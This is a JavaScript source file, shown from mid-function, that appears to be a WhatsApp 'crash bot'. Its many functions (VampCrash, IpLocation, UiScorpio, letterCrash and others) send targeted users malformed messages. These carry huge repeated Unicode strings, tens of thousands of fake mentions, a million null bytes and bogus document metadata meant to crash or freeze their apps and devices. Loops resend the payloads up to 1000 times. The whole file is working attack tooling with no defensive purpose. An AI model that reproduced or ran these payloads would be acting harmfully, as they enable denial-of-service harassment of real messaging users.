                  "1@newsletter",
                  "1@newsletter",
                ],
                groupMentions: [
                  {
                    groupJid: "1@newsletter",
                    groupSubject: "Vamp",
                  },
                ],
                quotedMessage: {
                  documentMessage: {
                    contactVcard: true,
                  },
                },
              },
            },
          },
        },
      },
      {
        participant: { jid: target },
        userJid: target,
      }
    );
  } catch (err) {
    console.log(err);
  }
}
async function xataiphone(target) {
  try {
    const messsage = {
      botInvokeMessage: {
        message: {
          newsletterAdminInviteMessage: {
            newsletterJid: `33333333333333333@newsletter`,
            newsletterName: "AETERNYX IS BEGINNER" + "ી".repeat(120000),
            jpegThumbnail: "",
            caption: "ꦽ".repeat(120000),
            inviteExpiration: Date.now() + 1814400000,
          },
        },
      },
    };
    await Prime.relayMessage(target, messsage, {
      userJid: target,
    });
  } catch (err) {
    console.log(err);
  }
}
async function IphoneDelay(Prime, target) {
  const generateLocationMessage = {
    viewOnceMessage: {
      message: {
        locationMessage: {
          degreesLatitude: 0,
          degreesLongitude: 0,
          name: "Im Aeternyx",
          address: "\u0000",
          contextInfo: {
            mentionedJid: Array.from(
              { length: 40000 },
              () =>
                "1" + Math.floor(Math.random() * 9000000) + "@s.whatsapp.net"
            ),
          },
        },
      },
    },
  };

  const locationMsg = generateWAMessageFromContent(
    target,
    generateLocationMessage,
    {}
  );

  await Prime.relayMessage(target, locationMsg.message, {
    messageId: locationMsg.key.id,
  });
}
async function TxIos(target, Ptcp = false) {
			await Prime.relayMessage(target, {
					"extendedTextMessage": {
						"text": "🩸 𝙰𝚎𝚝𝚎𝚛𝚗𝚢𝚡 𝙷𝚎𝚛𝚎 𝙱𝚛𝚘",
						"contextInfo": {
							"stanzaId": "1234567890ABCDEF",
							"participant": "13135550002@s.whatsapp.net",
							"quotedMessage": {
								"callLogMesssage": {
									"isVideo": true,
									"callOutcome": "1",
									"durationSecs": "0",
									"callType": "REGULAR",
									"participants": [{
										"jid": "13135550002@s.whatsapp.net",
										"callOutcome": "1"
									}]
								}
							},
							"remoteJid": target,
							"conversionSource": "source_example",
							"conversionData": "Y29udmVyc2lvbl9kYXRhX2V4YW1wbGU=",
							"conversionDelaySeconds": 10,
							"forwardingScore": 9999999,
							"isForwarded": true,
							"quotedAd": {
								"advertiserName": "Example Advertiser",
								"mediaType": "IMAGE",
								"jpegThumbnail": "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyw4P/Zztn////////////////CABEIAEgASAMBIgACEQEDEQH/xAAwAAADAQEBAQAAAAAAAAAAAAAABAUDAgYBAQEBAQEBAAAAAAAAAAAAAAAAAQIDBP/aAAwDAQACEAMQAAAAa4i3TThoJ/bUg9JER9UvkBoneppljfO/1jmV8u1DJv7qRBknbLmfreNLpWwq8n0E40cRaT6LmdeLtl/WZWbiY3z470JejkBaRJHRiuE5vSAmkKoXK8gDgCz/xAAsEAACAgEEAgEBBwUAAAAAAAABAgADBAUREiETMVEjEBQVIjJBQjNhYnFy/9oACAEBAAE/AMvKVPEBKqUtZrSdiF6nJr1NTqdwPYnNMJNyI+s01sPoxNbx7CA6kRUouTdJl4LI5I+xBk37ZG+/FopaxBZxAMrJqXd/1N6WPhi087n9+hG0PGt7JMzdDekcqZp2bZjWiq2XAWBTMyk1XHrozTMepMPkwlDrzff0vYmMq3M2Q5/5n9WxWO/vqV7nczIflZWgM1DTktauxeiDLPyeKaoD0Za9lOCmw3JlbE1EH27Ccmro8aDuVZpZkRk4kTHf6W/77zjzLvv3ynZKjeMoJH9pnoXDgDsCZ1ngxOPwJTULaqHG42EIazIA9ddiDC/OSWlXOupw0Z7kbettj8GUuwXd/wBZHQlR2XaMu5M1q7pK5g61XTWlbpGzKWdLq37iXISNoyhhLscK/PYmU1ty3/kfmWOtSgb9x8pKUZyf9CO9udkfLNMbTKEH1VJMbFxcVfJW0+9+B1JQlZ+NIwmHqFWVeQY3JrwR6AmblcbwP47zJZWs5Kej6mh4g7vaM6noJuJdjIWVwJfcgy0rA6ZZd1bYP8jNIdDQ/FBzWam9tVSPWxDmPZk3oFcE7RfKpExtSyMVeCepgaibOfkKiXZVIUlbASB1KOFfLKttHL9ljUVuxsa9diZhtjUVl6zM3KsQIUsU7xr7W9uZyb5M/8QAGxEAAgMBAQEAAAAAAAAAAAAAAREAECBRMWH/2gAIAQIBAT8Ap/IuUPM8wVx5UMcJgr//xAAdEQEAAQQDAQAAAAAAAAAAAAABAAIQESEgMVFh/9oACAEDAQE/ALY+wqSDk40Op7BTMEOywVPXErAhuNMDMdW//9k=",
								"caption": "This is an ad caption"
							},
							"placeholderKey": {
								"remoteJid": "6289501955295@s.whatsapp.net",
								"fromMe": false,
								"id": "ABCDEF1234567890"
							},
							"expiration": 86400,
							"ephemeralSettingTimestamp": "1728090592378",
							"ephemeralSharedSecret": "ZXBoZW1lcmFsX3NoYXJlZF9zZWNyZXRfZXhhbXBsZQ==",
							"externalAdReply": {
								"title": "༑𝐀𝐞𝐭𝐞𝐫𝐧𝐲𝐱͢⟡𝐕𝐨𝐱⃟💥",
								"body": "Trash-Iosϟ",
								"mediaType": "VIDEO",
								"renderLargerThumbnail": true,
								"previewTtpe": "VIDEO",
								"thumbnail": "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyw4P/Zztn////////////////CABEIAEgASAMBIgACEQEDEQH/xAAwAAADAQEBAQAAAAAAAAAAAAAABAUDAgYBAQEBAQEBAAAAAAAAAAAAAAAAAQIDBP/aAAwDAQACEAMQAAAAa4i3TThoJ/bUg9JER9UvkBoneppljfO/1jmV8u1DJv7qRBknbLmfreNLpWwq8n0E40cRaT6LmdeLtl/WZWbiY3z470JejkBaRJHRiuE5vSAmkKoXK8gDgCz/xAAsEAACAgEEAgEBBwUAAAAAAAABAgADBAUREiETMVEjEBQVIjJBQjNhYnFy/9oACAEBAAE/AMvKVPEBKqUtZrSdiF6nJr1NTqdwPYnNMJNyI+s01sPoxNbx7CA6kRUouTdJl4LI5I+xBk37ZG+/FopaxBZxAMrJqXd/1N6WPhi087n9+hG0PGt7JMzdDekcqZp2bZjWiq2XAWBTMyk1XHrozTMepMPkwlDrzff0vYmMq3M2Q5/5n9WxWO/vqV7nczIflZWgM1DTktauxeiDLPyeKaoD0Za9lOCmw3JlbE1EH27Ccmro8aDuVZpZkRk4kTHf6W/77zjzLvv3ynZKjeMoJH9pnoXDgDsCZ1ngxOPwJTULaqHG42EIazIA9ddiDC/OSWlXOupw0Z7kbettj8GUuwXd/wBZHQlR2XaMu5M1q7p5g61XTWlbpGzKWdLq37iXISNoyhhLscK/PYmU1ty3/kfmWOtSgb9x8pKUZyf9CO9udkfLNMbTKEH1VJMbFxcVfJW0+9+B1JQlZ+NIwmHqFWVeQY3JrwR6AmblcbwP47zJZWs5Kej6mh4g7vaM6noJuJdjIWVwJfcgy0rA6ZZd1bYP8jNIdDQ/FBzWam9tVSPWxDmPZk3oFcE7RfKpExtSyMVeCepgaibOfkKiXZVIUlbASB1KOFfLKttHL9ljUVuxsa9diZhtjUVl6zM3KsQIUsU7xr7W9uZyb5M/8QAGxEAAgMBAQEAAAAAAAAAAAAAAREAECBRMWH/2gAIAQIBAT8Ap/IuUPM8wVx5UMcJgr//xAAdEQEAAQQDAQAAAAAAAAAAAAABAAIQESEgMVFh/9oACAEDAQE/ALY+wqSDk40Op7BTMEOywVPXErAhuNMDMdW//9k=",
								"sourceType": " x ",
								"sourceId": " x ",
								"sourceUrl": "https://www.youtube.com/@Aeternyx-Prime",
								"mediaUrl": "https://www.youtube.com/@Aeternyx-Prime",
								"containsAutoReply": true,
								"renderLargerThumbnail": true,
								"showAdAttribution": true,
								"ctwaClid": "ctwa_clid_example",
								"ref": "ref_example"
							},
							"entryPointConversionSource": "entry_point_source_example",
							"entryPointConversionApp": "entry_point_app_example",
							"entryPointConversionDelaySeconds": 5,
							"disappearingMode": {},
							"actionLink": {
								"url": "https://t.me/biyalue2"
							},
							"groupSubject": "Example Group Subject",
							"parentGroupJid": "6287888888888-1234567890@g.us",
							"trustBannerType": "trust_banner_example",
							"trustBannerAction": 1,
							"isSampled": false,
							"utm": {
								"utmSource": "utm_source_example",
								"utmCampaign": "utm_campaign_example"
							},
							"forwardedNewsletterMessageInfo": {
								"newsletterJid": "6287888888888-1234567890@g.us",
								"serverMessageId": 1,
								"newsletterName": " X ",
								"contentType": "UPDATE",
								"accessibilityText": " X "
							},
							"businessMessageForwardInfo": {
								"businessOwnerJid": "0@s.whatsapp.net"
							},
							"smbClientCampaignId": "smb_client_campaign_id_example",
							"smbServerCampaignId": "smb_server_campaign_id_example",
							"dataSharingContext": {
								"showMmDisclosure": true
							}
						}
					}
				},
				Ptcp ? {
					participant: {
						jid: target
					}
				} : {}
			);
		};

async function IpLocation(target) {
  try {
    const IphoneCrash = "🩸𝙰𝚎𝚝𝚎𝚛𝚗𝚢𝚡 𝙷𝚎𝚛𝚎 𝙱𝚛𝚘" + "𑇂𑆵𑆴𑆿".repeat(60000);
    await Prime.relayMessage(target, {
      locationMessage: {
        degreesLatitude: 11.11,
        degreesLongitude: -11.11,
        name: "\u0000               " + IphoneCrash,
        url: "https://t.me/biyalue2"
      }
    }, {
      participant: { jid: target }
    });
  } catch (error) {
    console.error("ERROR SENDING IOSTRAVA:", error);
  }
}	
async function locationInvis(Prime, target) {
    const generateMessage = {
        viewOnceMessage: {
            message: {
                liveLocationMessage: {
                    degreesLatitude: -9.09999262999,
                    degreesLongitude: 199.99963118999,
                    caption: "🩸 𝙰𝚎𝚝𝚎𝚛𝚗𝚢𝚡 𝙷𝚎𝚛𝚎 𝙱𝚛𝚘" + "𑇂𑆵𑆴𑆿".repeat(10000),
                    sequenceNumber: '0',
                    jpegThumbnail: '',
                contextInfo: {
                    mentionedJid: Array.from({
                        length: 30000
                    }, () => "1" + Math.floor(Math.random() * 500000) + "@s.whatsapp.net"),
                    isSampled: true,
                    participant: target,
                    remoteJid: "status@broadcast",
                    forwardingScore: 9741,
                    isForwarded: true
                }
            }
        }
    }
};

const msg = generateWAMessageFromContent(target, generateMessage, {});

await Prime.relayMessage("status@broadcast", msg.message, {
    messageId: msg.key.id,
    statusJidList: [target],
    additionalNodes: [{
        tag: "meta",
        attrs: {},
        content: [{
            tag: "mentioned_users",
            attrs: {},
            content: [{
                tag: "to",
                attrs: {
                    jid: target
                },
                content: undefined
            }]
        }]
    }]
});
}
async function fcapix(target) {
let apiClient = JSON.stringify({
    status: true,
    criador: "Carinho",
    resultado: {
        type: "md",
        ws: {
            _events: { "CB:ib,,dirty": ["Array"] },
            _eventsCount: 800000,
            _maxListeners: 0,
            url: "wss://web.whatsapp.com/ws/chat",
            config: {
                version: ["Array"],
                browser: ["Array"],
                waWebSocketUrl: "wss://web.whatsapp.com/ws/chat",
                sockCectTimeoutMs: 20000,
                keepAliveIntervalMs: 30000,
                logger: {},
                printQRInTerminal: false,
                emitOwnEvents: true,
                defaultQueryTimeoutMs: 60000,
                customUploadHosts: [],
                retryRequestDelayMs: 250,
                maxMsgRetryCount: 5,
                fireInitQueries: true,
                auth: { Object: "authData" },
                markOnlineOnsockCect: true,
                syncFullHistory: true,
                linkPreviewImageThumbnailWidth: 192,
                transactionOpts: { Object: "transactionOptsData" },
                generateHighQualityLinkPreview: false,
                options: {},
                appStateMacVerification: { Object: "appStateMacData" },
                mobile: true
            }
        }
    }
});
  let msg = await generateWAMessageFromContent(
    isTarget,
    {
      viewOnceMessage: {
        message: {
          interactiveMessage: {
          contextInfo: {
            participant: "0@s.whatsapp.net",
            remoteJid: "status@broadcast",
            mentionedJid: [target],
            forwardedNewsletterMessageInfo: {
              newsletterName: "Aeternyx | I'm Beginner",
              newsletterJid: "120363321780343299@newsletter",
              serverMessageId: 1
            },
            externalAdReply: {
              showAdAttribution: true,
              title: "Hai",
              body: "",
              thumbnailUrl: null,
              sourceUrl: "https://www.youtube.com/@Aeternyx-Prime",
              mediaType: 1,
              renderLargerThumbnail: true
            },
            businessMessageForwardInfo: {
              businessOwnerJid: isTarget,
            },
            dataSharingContext: {
              showMmDisclosure: true,
            },
            quotedMessage: {
              paymentInviteMessage: {
                serviceType: 1,
                expiryTimestamp: null
              }
            }
          },
            header: {
              title: "",
              hasMediaAttachment: false
            },
            body: {
              text: "༑𝐀𝐞𝐭𝐞𝐫𝐧𝐲𝐱͢⟡𝐕𝐨𝐱⃟🎭⿻‌‌‌‌‌‌‌‌‏⭑‌\n‌‌‌‌‌‌‌‏⭑‌\n",
            },
            nativeFlowMessage: {
              messageParamsJson: "{\"name\":\"galaxy_message\",\"title\":\"galaxy_message\",\"header\":\"Ryuichi - Beginner\",\"body\":\"Call Galaxy\"}",
              buttons: [
                {
                  name: "single_select",
                  buttonParamsJson: apiClient + "༑𝐀𝐞𝐭𝐞𝐫𝐧𝐲𝐱͢⟡𝐕𝐨𝐱⃟🎭⿻‌‌‌‌‌‌‌‌‏⭑‌\n‌‌‌‌‌‌‌‏⭑‌\n",
                },
                {
                  name: "call_permission_request",
                  buttonParamsJson: apiClient + "༑𝐀𝐞𝐭𝐞𝐫𝐧𝐲𝐱͢⟡𝐕𝐨𝐱⃟🎭⿻‌‌‌‌‌‌‌‌‏⭑‌\n‌‌‌‌‌‌‌‏⭑‌\n",
                }, 
                {
                  name: "payment_method",
                  buttonParamsJson: ""
                },
                {
                  name: "payment_status",
                  buttonParamsJson: ""
                },
                {
                  name: "review_order",
                  buttonParamsJson: ""
                },
              ],
            },
          },
        },
      },
    },
    {}
  );

  await Prime.relayMessage(target, msg.message, {
    participant: { jid: target },
    messageId: msg.key.id
  });
}
async function VampCrash(Prime, target) {
    let msg = await generateWAMessageFromContent(target, {
        viewOnceMessage: {
            message: {
                interactiveMessage: {
                    header: {
                        title: "༑𝐀𝐞𝐭𝐞𝐫𝐧𝐲𝐱͢⟡𝐕𝐨𝐱⃟💥\n",
                        hasMediaAttachment: false
                    },
                    body: {
                        text: "Sholat Bro Sebelum Di Sholatin" + "ꦾ".repeat(50000) + "ꦽ".repeat(50000),
                    },
                    nativeFlowMessage: {
                        messageParamsJson: "",
                        buttons: [
                            {
                                name: "cta_url",
                                buttonParamsJson: "Ih Lucunya"
                            },
                            {
                                name: "call_permission_request",
                                buttonParamsJson: "I Fomo"
                            }
                        ]
                    }
                }
            }
        }
    }, {});

    await Prime.relayMessage(target, msg.message, { participant: { jid: target } }, { messageId: null });
}
async function VampDeviceCrash(Prime, target) {
    await Prime.relayMessage(target, {
        viewOnceMessage: {
            message: {
                interactiveResponseMessage: {
                    body: {
                        text: "Hi...I'm Aeternyx",
                        format: "DEFAULT"
                    },
                    nativeFlowResponseMessage: {
                        name: "call_permission_request",
                        paramsJson: "\u0000".repeat(1000000),
                        version: 3
                    }
                }
            }
        }
    }, { participant: { jid: target}});
}
async function VampAttack(Prime, target) {
    let msg = await generateWAMessageFromContent(target, {
        viewOnceMessage: {
            message: {
                interactiveMessage: {
                    header: {
                        title: "༑𝐀𝐞𝐭𝐞𝐫𝐧𝐲𝐱͢⟡𝐕𝐨𝐱⃟💥\n",
                        hasMediaAttachment: false
                    },
                    body: {
                        text: "Pal Pale" + "ꦾ".repeat(50000) + "ꦽ".repeat(50000),
                    },
                    nativeFlowMessage: {
                        messageParamsJson: "",
                        buttons: [
                            {
                                name: "cta_url",
                                buttonParamsJson: "Aeternyx Is Beginner"
                            },
                            {
                                name: "call_permission_request",
                                buttonParamsJson: "Ambatukam"
                            }
                        ]
                    }
                }
            }
        }
    }, {});

    await Prime.relayMessage(target, msg.message, { participant: { jid: target } }, { messageId: null });
}
async function UiScorpio(target) {
    const messagePayload = {
        groupMentionedMessage: {
            message: {
                interactiveMessage: {
                    header: {
                        documentMessage: {
                                url: "https://mmg.whatsapp.net/v/t62.7119-24/40377567_1587482692048785_2833698759492825282_n.enc?ccb=11-4&oh=01_Q5AaIEOZFiVRPJrllJNvRA-D4JtOaEYtXl0gmSTFWkGxASLZ&oe=666DBE7C&_nc_sid=5e03e0&mms3=true",
                                mimetype: "application/vnd.openxmlformats-officedocument.wordprocessingml.document",
                                fileSha256: "ld5gnmaib+1mBCWrcNmekjB4fHhyjAPOHJ+UMD3uy4k=",
                                fileLength: "999999999999",
                                pageCount: 0x9ff9ff9ff1ff8ff4ff5f,
                                mediaKey: "5c/W3BCWjPMFAUUxTSYtYPLWZGWuBV13mWOgQwNdFcg=",
                                fileName: `🩸 𝙰𝚎𝚝𝚎𝚛𝚗𝚢𝚡 𝙷𝚎𝚛𝚎 𝙱𝚛𝚘.pdf`,
                                fileEncSha256: "pznYBS1N6gr9RZ66Fx7L3AyLIU2RY5LHCKhxXerJnwQ=",
                                directPath: "/v/t62.7119-24/40377567_1587482692048785_2833698759492825282_n.enc?ccb=11-4&oh=01_Q5AaIEOZFiVRPJrllJNvRA-D4JtOaEYtXl0gmSTFWkGxASLZ&oe=666DBE7C&_nc_sid=5e03e0",
                                mediaKeyTimestamp: "1715880173"
                            },
                        hasMediaAttachment: true
                    },
                    body: {
                            text: "🩸 𝙰𝚎𝚝𝚎𝚛𝚗𝚢𝚡 𝙷𝚎𝚛𝚎 𝙱𝚛𝚘" + "ꦾ".repeat(150000) + "@1".repeat(250000)
                    },
                    nativeFlowMessage: {},
                    contextInfo: {
                            mentionedJid: Array.from({ length: 5 }, () => "1@newsletter"),
                            groupMentions: [{ groupJid: "1@newsletter", groupSubject: "RIZXVELZ" }],
                        isForwarded: true,
                        quotedMessage: {
        documentMessage: {
           url: "https://mmg.whatsapp.net/v/t62.7119-24/23916836_520634057154756_7085001491915554233_n.enc?ccb=11-4&oh=01_Q5AaIC-Lp-dxAvSMzTrKM5ayF-t_146syNXClZWl3LMMaBvO&oe=66F0EDE2&_nc_sid=5e03e0",
           mimetype: "application/vnd.openxmlformats-officedocument.presentationml.presentation",
           fileSha256: "QYxh+KzzJ0ETCFifd1/x3q6d8jnBpfwTSZhazHRkqKo=",
           fileLength: "999999999999",
           pageCount: 0x9ff9ff9ff1ff8ff4ff5f,
           mediaKey: "lCSc0f3rQVHwMkB90Fbjsk1gvO+taO4DuF+kBUgjvRw=",
           fileName: "Zoro The Juftt️",
           fileEncSha256: "wAzguXhFkO0y1XQQhFUI0FJhmT8q7EDwPggNb89u+e4=",
           directPath: "/v/t62.7119-24/23916836_520634057154756_7085001491915554233_n.enc?ccb=11-4&oh=01_Q5AaIC-Lp-dxAvSMzTrKM5ayF-t_146syNXClZWl3LMMaBvO&oe=66F0EDE2&_nc_sid=5e03e0",
           mediaKeyTimestamp: "1724474503",
           contactVcard: true,
           thumbnailDirectPath: "/v/t62.36145-24/13758177_1552850538971632_7230726434856150882_n.enc?ccb=11-4&oh=01_Q5AaIBZON6q7TQCUurtjMJBeCAHO6qa0r7rHVON2uSP6B-2l&oe=669E4877&_nc_sid=5e03e0",
           thumbnailSha256: "njX6H6/YF1rowHI+mwrJTuZsw0n4F/57NaWVcs85s6Y=",
           thumbnailEncSha256: "gBrSXxsWEaJtJw4fweauzivgNm2/zdnJ9u1hZTxLrhE=",
           jpegThumbnail: "",
      }
                    }
                    }
                }
            }
        }
    };

    Prime.relayMessage(target, messagePayload, {}, { messageId: null });
}

async function LocUiNew(target, Ptcp = true) {
  try {
    await Prime.relayMessage(
      target,
      {
        ephemeralMessage: {
          message: {
            interactiveMessage: {
              header: {
                locationMessage: {
                  degreesLatitude: 0,
                  degreesLongitude: 0,
                },
                hasMediaAttachment: true,
              },
              body: {
                text:
                  "🩸 𝙰𝚎𝚝𝚎𝚛𝚗𝚢𝚡 𝙷𝚎𝚛𝚎 𝙱𝚛𝚘\n" +
                  "ꦾ".repeat(92000) +
                  "ꦽ".repeat(92000) +
                  `@1`.repeat(92000),
              },
              nativeFlowMessage: {},
              contextInfo: {
                mentionedJid: [
                  "1@newsletter",
                  "1@newsletter",
                  "1@newsletter",
                  "1@newsletter",
                  "1@newsletter",
                ],
                groupMentions: [
                  {
                    groupJid: "1@newsletter",
                    groupSubject: "X",
                  },
                ],
                quotedMessage: {
                  documentMessage: {
                    contactVcard: true,
                  },
                },
              },
            },
          },
        },
      },
      {
        participant: { jid: target },
        userJid: target,
      }
    );
  } catch (err) {
    console.log(err);
  }
}

async function letterCrash(Prime, target, Ptcp = true) {
  let virtex = "*🩸 *" + "ꦾ".repeat(77777) + "@1".repeat(77777);
  var messageContent = generateWAMessageFromContent(target, proto.Message.fromObject({
    viewOnceMessage: {
      message: {
        newsletterAdminInviteMessage: {
          newsletterJid: `120363319314627296@newsletter`,
          newsletterName: virtex,
          jpegThumbnail: "",
          caption: virtex,
          inviteExpiration: Date.now() + 1814400000
        },
        contextInfo: {
          mentionedJid: ["13135550002@s.whatsapp.net"],
          groupMentions: [
            {
              groupJid: `120363319314627296@newsletter`,
              groupSubject: virtex
            }
          ]
        }
      }
    }
  }), {
    userJid: target
  });

  await Prime.relayMessage(target, messageContent.message, {
    participant: { jid: target },
    messageId: messageContent.key.id
  });
}      
////////////////////Params///////////////////////
async function blankprime1(target) {
  const delay = getGlobalDelay();
  for (let i = 0; i < 1; i++) {
    try {
      await letterCrash(target, Ptcp = true);
      await sleep(delay);
      await natifui(target);
      await sleep(delay);
      await crashui(target);
      await sleep(delay);
      await CrL(target, Ptcp = true);
      await sleep(delay);
      await LocUiNew(target, Ptcp = true);
      await sleep(delay);
      await UiScorpio(target);
      await sleep(delay);
      await broadcastpayload(target);
      await sleep(delay);
      } catch (error) {
      console.error(`Error at iteration ${i}:`, error);
    }
  }
}

async function blankprime2(target) {
  const delay = getGlobalDelay();
  for (let i = 0; i < 1; i++) {
    try {
    await xatanewfunction(target);
    await sleep(delay)
    await VampPrivateBlank(target);
    await sleep(delay);
    await VampSpamUi(target);
    await sleep(delay);
    await VampDeviceCrash(Prime, target);
    await sleep(delay);
    await fcapix(target);
    await sleep(delay);
    await VampCrash(Prime, target);
    await sleep(delay);
    await VampAttack(Prime, target);
    await sleep(delay);
      } catch (error) {
      console.error(`Error at iteration ${i}:`, error);
    }
  }
}

async function CrashDelay(target) {
  const delay = getGlobalDelay();
  for (let i = 0; i < 1000; i++) {
    try {
      await megaCrashFusion(target);
      await sleep(delay);
      await megaCrashFusion(target);
      await sleep(delay);
      await megaCrashFusion(target);
      await sleep(delay);
    } catch (error) {
      console.error(`Error at iteration ${i}:`, error);
    }
  }
}

async function ExtraKuota1GB(target) {
const delay = getGlobalDelay();
for (let dozer = 0; dozer < 1000; dozer++) {
    await bulldozer1GB(target);
    await sleep(delay)
}
}
// --- Jalankan Bot ---

(async () => {
  console.clear();
  console.log("🚀 Memulai sesi WhatsApp...");
  startSesi();

  console.log("Sukses connected");
  bot.launch();

  // Membersihkan konsol sebelum menampilkan pesan sukses
  console.clear();
  console.log(
    chalk.bold.white(`\n

⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀`)
  );
})();